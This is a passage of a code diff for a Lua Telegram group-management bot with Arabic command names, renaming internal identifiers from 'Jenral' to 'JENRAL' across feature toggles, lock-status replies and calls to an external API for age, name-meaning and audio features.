+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Age:ALI'..msg.chat_id_) 
 end
 if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل حساب العمر'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Age:ALI'..msg.chat_id_,true)  
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل حساب العمر'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Age:ALI'..msg.chat_id_,true)  
 end
-if not DevALI:get(Jenral..'ALI:Age:ALI'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Age:ALI'..msg.chat_id_) then
 if text and text:match("^احسب (.*)$") and SourceCh(msg) or text and text:match("^عمري (.*)$") and SourceCh(msg) then 
 local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
 UrlAge = https.request('https://apiALI.ml/age.php?age='..URL.escape(TextAge)) 
@@ -8784,18 +8772,18 @@ t = Age.ok.ALI
 Dev_ALI(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "تفعيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل معاني الاسماء'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Mean:ALI'..msg.chat_id_) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل معاني الاسماء'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Mean:ALI'..msg.chat_id_) 
 end
 if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل معاني الاسماء'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Mean:ALI'..msg.chat_id_,true)  
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل معاني الاسماء'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Mean:ALI'..msg.chat_id_,true)  
 end
-if not DevALI:get(Jenral..'ALI:Mean:ALI'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Mean:ALI'..msg.chat_id_) then
 if text and text:match("^معنى الاسم (.*)$") and SourceCh(msg) or text and text:match("^معنى اسم (.*)$") and SourceCh(msg) then 
 local TextMean = text:match("^معنى الاسم (.*)$") or text:match("^معنى اسم (.*)$") 
 UrlMean = https.request('https://apiALI.ml/Mean.php?ALI='..URL.escape(TextMean)) 
@@ -8804,18 +8792,18 @@ t = Mean.ok.ALI
 Dev_ALI(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "تفعيل غنيلي" and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل غنيلي بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Audios:ALI'..msg.chat_id_) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل غنيلي بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Audios:ALI'..msg.chat_id_) 
 end
 if text == "تعطيل غنيلي" and Manager(msg) and ChCheck(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل غنيلي بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Audios:ALI'..msg.chat_id_,true)  
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل غنيلي بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Audios:ALI'..msg.chat_id_,true)  
 end
-if text == "غنيلي" and not DevALI:get(Jenral..'ALI:Audios:ALI'..msg.chat_id_) and SourceCh(msg) then
+if text == "غنيلي" and not DevALI:get(JENRAL..'ALI:Audios:ALI'..msg.chat_id_) and SourceCh(msg) then
 data,res = https.request('https://apiALI.ml/Audios.php')
 if res == 200 then
 Audios = json:decode(data)
@@ -8823,122 +8811,122 @@ if Audios.Info == true then
 local Text ='⌁︙تم اختيار المقطع الصوتي لك'
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '⌁ ᴊᴇɴʀᴀʟ ѕᴏụʀᴄᴇ .',url="t.me/GENRALTEAM"}},
+{{text = '⌁ JENRAL TeAM .',url="t.me/GENRALTEAM"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id='..msg.chat_id_..'&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Admin(msg) then
-if DevALI:get(Jenral..'ALI:LockSettings'..msg.chat_id_) then 
-if text == "الروابط" then if DevALI:get(Jenral..'ALI:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙الروابط ↫ "..mute_links.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "المعرف" or text == "المعرفات" then if DevALI:get(Jenral..'ALI:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙المعرف ↫ "..lock_tag.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "المتحركه" or text == "الملصقات المتحركه" then if DevALI:get(Jenral..'ALI:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙المتحركه ↫ "..mute_gifs.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الملصقات" then if DevALI:get(Jenral..'ALI:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙الملصقات ↫ "..lock_sticker.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الصور" then if DevALI:get(Jenral..'ALI:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙الصور ↫ "..mute_photo.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الفيديو" or text == "الفيديوهات" then if DevALI:get(Jenral..'ALI:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙الفيديو ↫ "..mute_video.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الاونلاين" then if DevALI:get(Jenral..'ALI:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local JenralTEAM = "\n" .."⌁︙الاونلاين ↫ "..mute_in.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الدردشه" then if DevALI:get(Jenral..'ALI:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙الدردشه ↫ "..mute_text.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "التوجيه" or text == "اعاده التوجيه" then if DevALI:get(Jenral..'ALI:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local JenralTEAM = "\n" .."⌁︙التوجيه ↫ "..lock_forward.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الاغاني" then if DevALI:get(Jenral..'ALI:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙الاغاني ↫ "..mute_music.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الصوت" or text == "الصوتيات" then if DevALI:get(Jenral..'ALI:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local JenralTEAM = "\n" .."⌁︙الصوت ↫ "..mute_voice.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الجهات" or text == "جهات الاتصال" then if DevALI:get(Jenral..'ALI:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙الجهات ↫ "..lock_contact.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الماركداون" then if DevALI:get(Jenral..'ALI:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local JenralTEAM = "\n" .."⌁︙الماركداون ↫ "..markdown.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الهاشتاك" then if DevALI:get(Jenral..'ALI:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local JenralTEAM = "\n" .."⌁︙الهاشتاك ↫ "..lock_htag.."\n"Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "التعديل" then if DevALI:get(Jenral..'ALI:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local JenralTEAM = "\n" .."⌁︙التعديل ↫ "..mute_edit.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "التثبيت" then if DevALI:get(Jenral..'ALI:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local JenralTEAM = "\n" .."⌁︙التثبيت ↫ "..lock_pin.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الاشعارات" then if DevALI:get(Jenral..'ALI:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الكلايش" then if DevALI:get(Jenral..'ALI:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙الكلايش ↫ "..lock_spam.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الدخول" then if DevALI:get(Jenral..'ALI:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local JenralTEAM = "\n" .."⌁︙الدخول ↫ "..lock_Join.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الشبكات" then if DevALI:get(Jenral..'ALI:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙الشبكات ↫ "..lock_wp.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "المواقع" then if DevALI:get(Jenral..'ALI:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙المواقع ↫ "..lock_location.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "العربيه" then if DevALI:get(Jenral..'ALI:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙العربيه ↫ "..lock_arabic.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الانكليزيه" then if DevALI:get(Jenral..'ALI:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local JenralTEAM = "\n" .."⌁︙الانكليزيه ↫ "..lock_english.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الكفر" then if DevALI:get(Jenral..'ALI:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local JenralTEAM = "\n" .."⌁︙الكفر ↫ "..lock_kaf.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الفشار" then if DevALI:get(Jenral..'ALI:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local JenralTEAM = "\n" .."⌁︙الفشار ↫ "..lock_fshar.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
-if text == "الطائفيه" then if DevALI:get(Jenral..'ALI:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local JenralTEAM = "\n" .."⌁︙الطائفيه ↫ "..lock_taf.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM, 1, 'md') end
+if DevALI:get(JENRAL..'ALI:LockSettings'..msg.chat_id_) then 
+if text == "الروابط" then if DevALI:get(JENRAL..'ALI:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙الروابط ↫ "..mute_links.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "المعرف" or text == "المعرفات" then if DevALI:get(JENRAL..'ALI:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙المعرف ↫ "..lock_tag.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "المتحركه" or text == "الملصقات المتحركه" then if DevALI:get(JENRAL..'ALI:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙المتحركه ↫ "..mute_gifs.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الملصقات" then if DevALI:get(JENRAL..'ALI:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙الملصقات ↫ "..lock_sticker.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الصور" then if DevALI:get(JENRAL..'ALI:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙الصور ↫ "..mute_photo.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الفيديو" or text == "الفيديوهات" then if DevALI:get(JENRAL..'ALI:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙الفيديو ↫ "..mute_video.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الاونلاين" then if DevALI:get(JENRAL..'ALI:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local JENRALTEAM = "\n" .."⌁︙الاونلاين ↫ "..mute_in.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الدردشه" then if DevALI:get(JENRAL..'ALI:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙الدردشه ↫ "..mute_text.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "التوجيه" or text == "اعاده التوجيه" then if DevALI:get(JENRAL..'ALI:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local JENRALTEAM = "\n" .."⌁︙التوجيه ↫ "..lock_forward.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الاغاني" then if DevALI:get(JENRAL..'ALI:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙الاغاني ↫ "..mute_music.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الصوت" or text == "الصوتيات" then if DevALI:get(JENRAL..'ALI:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local JENRALTEAM = "\n" .."⌁︙الصوت ↫ "..mute_voice.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الجهات" or text == "جهات الاتصال" then if DevALI:get(JENRAL..'ALI:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙الجهات ↫ "..lock_contact.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الماركداون" then if DevALI:get(JENRAL..'ALI:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local JENRALTEAM = "\n" .."⌁︙الماركداون ↫ "..markdown.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الهاشتاك" then if DevALI:get(JENRAL..'ALI:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local JENRALTEAM = "\n" .."⌁︙الهاشتاك ↫ "..lock_htag.."\n"Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "التعديل" then if DevALI:get(JENRAL..'ALI:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local JENRALTEAM = "\n" .."⌁︙التعديل ↫ "..mute_edit.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "التثبيت" then if DevALI:get(JENRAL..'ALI:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local JENRALTEAM = "\n" .."⌁︙التثبيت ↫ "..lock_pin.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الاشعارات" then if DevALI:get(JENRAL..'ALI:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الكلايش" then if DevALI:get(JENRAL..'ALI:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙الكلايش ↫ "..lock_spam.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الدخول" then if DevALI:get(JENRAL..'ALI:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local JENRALTEAM = "\n" .."⌁︙الدخول ↫ "..lock_Join.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الشبكات" then if DevALI:get(JENRAL..'ALI:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙الشبكات ↫ "..lock_wp.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "المواقع" then if DevALI:get(JENRAL..'ALI:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙المواقع ↫ "..lock_location.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "العربيه" then if DevALI:get(JENRAL..'ALI:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙العربيه ↫ "..lock_arabic.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الانكليزيه" then if DevALI:get(JENRAL..'ALI:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local JENRALTEAM = "\n" .."⌁︙الانكليزيه ↫ "..lock_english.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الكفر" then if DevALI:get(JENRAL..'ALI:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local JENRALTEAM = "\n" .."⌁︙الكفر ↫ "..lock_kaf.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الفشار" then if DevALI:get(JENRAL..'ALI:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local JENRALTEAM = "\n" .."⌁︙الفشار ↫ "..lock_fshar.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
+if text == "الطائفيه" then if DevALI:get(JENRAL..'ALI:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local JENRALTEAM = "\n" .."⌁︙الطائفيه ↫ "..lock_taf.."\n" Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM, 1, 'md') end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل كشف الاعدادات'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:LockSettings'..msg.chat_id_,true)  
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل كشف الاعدادات'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:LockSettings'..msg.chat_id_,true)  
 end
 if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل كشف الاعدادات'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:LockSettings'..msg.chat_id_) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل كشف الاعدادات'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:LockSettings'..msg.chat_id_) 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'تفعيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل اوامر التحشيش'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Lock:Stupid'..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل اوامر التحشيش'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Lock:Stupid'..msg.chat_id_)
 end
 if text == 'تعطيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل اوامر التحشيش'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Lock:Stupid'..msg.chat_id_,true)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل اوامر التحشيش'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Lock:Stupid'..msg.chat_id_,true)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and (text == 'تعطيل التحقق' or text == 'قفل التحقق' or text == 'تعطيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل التحقق بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Lock:Robot'..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل التحقق بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Lock:Robot'..msg.chat_id_)
 end
 if text and (text == 'تفعيل التحقق' or text == 'فتح التحقق' or text == 'تفعيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل التحقق بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Lock:Robot'..msg.chat_id_,true)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل التحقق بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Lock:Robot'..msg.chat_id_,true)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل ردود المدير'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Lock:GpRed'..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل ردود المدير'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Lock:GpRed'..msg.chat_id_)
 end
 if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل ردود المدير'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Lock:GpRed'..msg.chat_id_,true)
